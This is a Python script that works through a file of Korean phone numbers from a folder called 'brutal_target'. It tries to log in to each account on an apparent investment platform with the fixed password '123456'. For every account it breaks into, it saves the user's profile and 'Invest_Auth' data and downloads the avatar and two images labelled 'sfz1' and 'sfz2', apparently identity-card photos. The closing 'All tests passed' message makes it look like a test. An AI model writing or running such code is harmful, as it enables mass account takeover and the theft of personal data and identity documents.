from library import UserDataSaver, get_config, ApiClient, parse_phone
import pandas as pd
def get_second_column(filename):
    df = pd.read_csv(filename, header=None)   # or header=0 if the file has a header
    return df.iloc[:, 1].tolist()

def main():

    
    login_list = get_second_column('brutal_target/korea_lay1.csv')
    failing_list = []
    saving_folder = UserDataSaver("layman")
    for full_phone in login_list[7325:]:
        
        country_code, phone_num = parse_phone.parse_phone(full_phone)
        if country_code is not None:
            cfg = get_config(82)
            with ApiClient(cfg) as client:
                try:
                    print("working on " +phone_num)
                    token = client.login(phone_num, "123456")
                    if token is not None:
                        json = client.get_single_json(cfg.USER_INFO_URL, token=token)
                        saving_folder.save_user_csv(phone_num, json.get("row"), "user_info")
                        saving_folder.download_option_picture(json.get("row"), "avatar", phone_num)
                        if json.get("row"):
                            saving_folder.save_user_csv(phone_num, json.get("row"), "Invest_Auth")
                            saving_folder.download_option_picture(json.get("row"), "sfz1", phone_num)
                            saving_folder.download_option_picture(json.get("row"), "sfz2", phone_num)

                except AssertionError as e:
                    failing_list.append({"item":  country_code, "reason": str(e)})

    # Output results
    # print(f"\nTotal items: {len(items)}")
    # print(f"Passed: {len(items) - len(failing_list)}")
    # print(f"Failed: {len(failing_list)}")

    if failing_list:
        print("\nFailing items:")
        for failure in failing_list:
            print(f"  • {failure['reason']}")
    else:
        print("\nAll tests passed! 🎉")



if __name__ == "__main__":
    main()
